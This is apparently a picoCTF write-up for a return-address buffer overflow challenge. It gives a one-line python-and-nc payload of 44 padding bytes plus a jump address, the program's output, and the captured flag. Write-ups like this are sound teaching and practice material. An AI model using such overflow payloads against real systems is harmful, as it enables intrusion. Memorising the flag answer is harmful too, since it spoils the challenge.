## Introducción
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 57373`

1.-Make sure you consider big Endian vs small Endian.
2.- Changing the address of the return pointer can call different functions.

## Descripción
```
┌──(root㉿kali)-[~]
└─# (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 57373 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
 picoCTF{addr3ss3s_ar3_3asy_6462ca2d} 
```

## Solución 
picoCTF{addr3ss3s_ar3_3asy_6462ca2d} 